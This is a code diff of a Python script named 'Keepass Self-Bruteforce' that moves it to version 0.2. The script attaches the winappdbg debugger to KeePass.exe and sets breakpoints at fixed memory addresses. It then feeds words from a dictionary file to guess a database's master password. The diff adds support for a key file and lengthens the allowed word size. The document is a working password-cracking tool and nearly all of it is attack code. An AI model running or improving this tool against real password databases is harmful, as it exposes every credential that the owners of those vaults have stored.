@@ -1,14 +1,20 @@
-# Keepass Self-Bruteforce v0.1
+# Keepass Self-Bruteforce v0.2
 # Based in Keepass version 1.7
 # Programmed by Miguel Febres
-# mafebresv at q-protex.com
+# mfebres@q-protex.com
 # http://www.q-protex.com
-
+# 
+ 
 # Performance: 50~60 words per second (Core Duo 2.2GHZ)
+
+# What is new?
+# v0.2: Keyfile option added (Thanks to Tanel Rebane <tanel@rebane.se>) 
+#
 
 from winappdbg import Debug
 from time import strftime
 import time
+import os.path
 
 counter=0
 word=""
@@ -17,7 +23,7 @@ r_eax=0
 r_ecx=0
 r_edx=0
 
-WORD_SIZE = 20
+WORD_SIZE = 35
 
 #Save the state of the registers
 def action_0( event ):
@@ -79,13 +85,21 @@ def action_3( event ):
 words = open('dic.txt', "r").readlines()
 print "[+] Words Loaded: ",len(words)
 
+#Specify a key file
+keyfile = "pwsafe.key"
 
 try:
     debug = Debug()
 
     #Start a new process for debugging
     #Allocate 20 bytes for the words
-    aProcess = debug.execv( ['KeePass.exe', 'test.kdb','-pw:'.ljust(WORD_SIZE+4)])
+
+    if os.path.isfile(keyfile):
+        print "[+] Keyfile Loaded: '" + keyfile + "'"
+        aProcess = debug.execv( ['KeePass.exe', 'Database.kdb', '-keyfile:' + keyfile, '-pw:'.ljust(WORD_SIZE+4)])
+    else:
+        print "[+] Specified keyfile '" + keyfile + "' does not exist, ignoring argument"
+        aProcess = debug.execv( ['KeePass.exe', 'Database.kdb', '-pw:'.ljust(WORD_SIZE+4)])
 
     #Set the breakpoints
     debug.break_at(aProcess.get_pid() , 0x004DC395, action_0)
